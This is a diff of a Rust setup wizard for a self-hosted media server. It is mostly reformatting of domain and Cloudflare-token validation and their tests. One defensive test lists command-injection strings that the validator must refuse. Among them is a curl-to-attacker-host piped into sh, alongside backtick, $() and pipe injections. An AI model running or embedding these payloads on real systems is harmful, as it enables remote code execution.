@@ -13,7 +13,15 @@ use crate::sso::{self, SsoDecision};
 // bracket-negation forms a multi-line parse would need. That check is what
 // stops this list drifting from modules/lib/catalog.nix -- a drift whose
 // symptom is an app the operator simply cannot install.
-pub const CATALOG_APPS: &[&str] = &["jellyfin", "plex", "prowlarr", "qbittorrent", "radarr", "sabnzbd", "sonarr"];
+pub const CATALOG_APPS: &[&str] = &[
+    "jellyfin",
+    "plex",
+    "prowlarr",
+    "qbittorrent",
+    "radarr",
+    "sabnzbd",
+    "sonarr",
+];
 
 /// Apps that need the Cloudflare DNS-01 credential once published.
 ///
@@ -103,7 +111,10 @@ fn validate_domain(raw: &str) -> anyhow::Result<String> {
     if !d.contains('.') || d.starts_with('.') || d.ends_with('.') {
         anyhow::bail!("{d:?} is not a domain name");
     }
-    if !d.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-') {
+    if !d
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
+    {
         anyhow::bail!(
             "{d:?} contains characters that are not allowed in a domain name \
              (letters, digits, '.' and '-' only)"
@@ -304,7 +315,10 @@ pub fn validate_cloudflare_token(raw: &str) -> anyhow::Result<String> {
     }
     // An allowlist. Cloudflare issues tokens from exactly this set, and
     // this value ends up in an HTTP header where anything else is fatal.
-    if let Some(bad) = token.chars().find(|c| !(c.is_ascii_alphanumeric() || *c == '_' || *c == '-')) {
+    if let Some(bad) = token
+        .chars()
+        .find(|c| !(c.is_ascii_alphanumeric() || *c == '_' || *c == '-'))
+    {
         anyhow::bail!(
             "that Cloudflare token contains {bad:?} ({:#06x}), which cannot \
              appear in an HTTP Authorization header -- every certificate \
@@ -595,15 +609,20 @@ mod tests {
         // Whitespace is trimmed rather than refused -- a stray newline or
         // space around a paste is not the operator's mistake to fix twice.
         assert_eq!(
-            super::validate_cloudflare_token("  abcdefghij1234567890abcdefghij1234567890 \n").unwrap(),
+            super::validate_cloudflare_token("  abcdefghij1234567890abcdefghij1234567890 \n")
+                .unwrap(),
             "abcdefghij1234567890abcdefghij1234567890"
         );
 
         // Interior whitespace is a real problem and is refused.
-        assert!(super::validate_cloudflare_token("abcdefghij12345 67890abcdefghij12345678").is_err());
+        assert!(
+            super::validate_cloudflare_token("abcdefghij12345 67890abcdefghij12345678").is_err()
+        );
 
         // Too short to be a token at all.
-        let short = super::validate_cloudflare_token("abc").unwrap_err().to_string();
+        let short = super::validate_cloudflare_token("abc")
+            .unwrap_err()
+            .to_string();
         assert!(short.contains("too short"), "{short}");
 
         // A real one passes untouched.
@@ -669,11 +688,21 @@ mod tests {
     fn domains_must_look_like_domains() {
         assert_eq!(validate_domain(" TheSyms.ca ").unwrap(), "thesyms.ca");
         for bad in [
-            "localhost", ".a.com", "a.com.", "a b.com",
+            "localhost",
+            ".a.com",
+            "a.com.",
+            "a b.com",
             // The shapes that matter: this value reaches a remote root shell.
             "example.com;curl$IFS-sattacker/p|sh",
-            "a.com`id`", "a.com$(id)", "a.com|id", "a.com&id", "a.com'x'", "a.com\"x\"",
-            "-a.com", "a-.com", "a..com",
+            "a.com`id`",
+            "a.com$(id)",
+            "a.com|id",
+            "a.com&id",
+            "a.com'x'",
+            "a.com\"x\"",
+            "-a.com",
+            "a-.com",
+            "a..com",
         ] {
             assert!(validate_domain(bad).is_err(), "accepted {bad:?}");
         }
@@ -682,7 +711,10 @@ mod tests {
     #[test]
     fn app_selection_accepts_names_all_and_nothing() {
         assert_eq!(parse_app_selection("").unwrap(), Vec::<String>::new());
-        assert_eq!(parse_app_selection("ALL").unwrap().len(), CATALOG_APPS.len());
+        assert_eq!(
+            parse_app_selection("ALL").unwrap().len(),
+            CATALOG_APPS.len()
+        );
         assert_eq!(
             parse_app_selection("sonarr, radarr").unwrap(),
             vec!["radarr", "sonarr"]
@@ -692,10 +724,18 @@ mod tests {
 
     #[test]
     fn an_unknown_app_names_itself_and_the_alternatives() {
-        let err = parse_app_selection("sonarr, radar").unwrap_err().to_string();
+        let err = parse_app_selection("sonarr, radar")
+            .unwrap_err()
+            .to_string();
         assert!(err.contains("radar"), "{err}");
-        assert!(err.contains("radarr"), "the real name should be listed: {err}");
-        assert!(!err.contains("sonarr,"), "should not implicate the valid one: {err}");
+        assert!(
+            err.contains("radarr"),
+            "the real name should be listed: {err}"
+        );
+        assert!(
+            !err.contains("sonarr,"),
+            "should not implicate the valid one: {err}"
+        );
     }
 
     #[test]
@@ -705,7 +745,7 @@ mod tests {
             "thesyms.ca",
             "me@thesyms.ca",
             "sonarr, plex",
-            "",               // SSO: default yes
+            "", // SSO: default yes
             "admin@thesyms.ca",
             "cftokenvalue1234567890abcdefghijklmnopqr",
         ]);
@@ -715,7 +755,10 @@ mod tests {
         assert_eq!(a.base_domain.as_deref(), Some("thesyms.ca"));
         assert_eq!(a.apps, vec!["plex", "sonarr"]);
         assert!(a.sso.enabled);
-        assert_eq!(a.cloudflare_token.as_ref().map(Secret::expose), Some("cftokenvalue1234567890abcdefghijklmnopqr"));
+        assert_eq!(
+            a.cloudflare_token.as_ref().map(Secret::expose),
+            Some("cftokenvalue1234567890abcdefghijklmnopqr")
+        );
     }
 
     /// No domain means nothing is published, so neither ACME nor the token
@@ -793,16 +836,26 @@ mod tests {
     #[test]
     fn the_token_is_only_ever_held_in_memory() {
         let mut io = Scripted::new(&[
-            "saltbox", "thesyms.ca", "me@thesyms.ca", "sonarr", "", "a@b.co", "secrettoken1234567890abcdefghijklmnopqrs",
+            "saltbox",
+            "thesyms.ca",
+            "me@thesyms.ca",
+            "sonarr",
+            "",
+            "a@b.co",
+            "secrettoken1234567890abcdefghijklmnopqrs",
         ]);
         let fake = healthy_cloudflare();
         let a = collect(&mut io, &verifying_against(&fake)).unwrap();
         assert!(
-            !io.transcript().contains("secrettoken1234567890abcdefghijklmnopqrs"),
+            !io.transcript()
+                .contains("secrettoken1234567890abcdefghijklmnopqrs"),
             "the token must never be echoed back: {}",
             io.transcript()
         );
-        assert_eq!(a.cloudflare_token.as_ref().map(Secret::expose), Some("secrettoken1234567890abcdefghijklmnopqrs"));
+        assert_eq!(
+            a.cloudflare_token.as_ref().map(Secret::expose),
+            Some("secrettoken1234567890abcdefghijklmnopqrs")
+        );
     }
 
     /// A resume must never re-prompt: the operator answered before
@@ -862,27 +915,48 @@ mod tests {
     #[test]
     fn the_token_is_asked_for_without_echo() {
         let mut io = Scripted::new(&[
-            "saltbox", "thesyms.ca", "me@thesyms.ca", "sonarr", "", "a@b.co",
+            "saltbox",
+            "thesyms.ca",
+            "me@thesyms.ca",
+            "sonarr",
+            "",
+            "a@b.co",
             "tokentokentoken1234567890abcdefghijklmno",
         ]);
         let fake = healthy_cloudflare();
         collect(&mut io, &verifying_against(&fake)).unwrap();
-        assert_eq!(io.secret_asks.len(), 1, "the token must use the non-echoing prompt");
+        assert_eq!(
+            io.secret_asks.len(),
+            1,
+            "the token must use the non-echoing prompt"
+        );
         assert!(io.secret_asks[0].contains("Cloudflare"));
     }
 
     #[test]
     fn the_token_cannot_be_printed_by_debug() {
         let mut io = Scripted::new(&[
-            "saltbox", "thesyms.ca", "me@thesyms.ca", "sonarr", "", "a@b.co", "supersecret1234567890abcdefghijklmnopqrs",
+            "saltbox",
+            "thesyms.ca",
+            "me@thesyms.ca",
+            "sonarr",
+            "",
+            "a@b.co",
+            "supersecret1234567890abcdefghijklmnopqrs",
         ]);
         let fake = healthy_cloudflare();
         let a = collect(&mut io, &verifying_against(&fake)).unwrap();
         let rendered = format!("{a:?}");
-        assert!(!rendered.contains("supersecret1234567890abcdefghijklmnopqrs"), "Debug leaked the token: {rendered}");
+        assert!(
+            !rendered.contains("supersecret1234567890abcdefghijklmnopqrs"),
+            "Debug leaked the token: {rendered}"
+        );
         assert!(rendered.contains("<redacted>"), "{rendered}");
         // ...and it is still retrievable where it is genuinely needed.
-        assert_eq!(a.cloudflare_token.as_ref().map(Secret::expose), Some("supersecret1234567890abcdefghijklmnopqrs"));
+        assert_eq!(
+            a.cloudflare_token.as_ref().map(Secret::expose),
+            Some("supersecret1234567890abcdefghijklmnopqrs")
+        );
     }
 
     /// The only credential these tests transmit: the fake's own dummy,
